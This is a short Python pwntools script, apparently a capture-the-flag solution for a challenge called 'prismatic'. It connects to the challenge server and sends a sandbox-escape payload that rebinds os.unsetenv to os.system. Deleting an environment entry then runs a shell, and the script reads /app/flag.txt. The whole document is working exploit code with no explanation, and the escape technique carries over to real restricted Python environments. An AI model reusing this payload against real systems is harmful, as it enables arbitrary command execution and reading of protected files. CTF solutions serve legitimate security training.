from pwn import *

#s = remote("localhost", 1337)
s = remote("prismatic.atreides.b01lersc.tf", 8443, ssl=True)
s.sendlineafter(
	b"> ",
	b"import os;import sys;[os for os.unsetenv in [os.system]];del os.environ[sys.executable]",
)
s.sendlineafter(b">>> ", b"print(open('/app/flag.txt').read())")
print(s.recvline().decode().split("\n")[0])
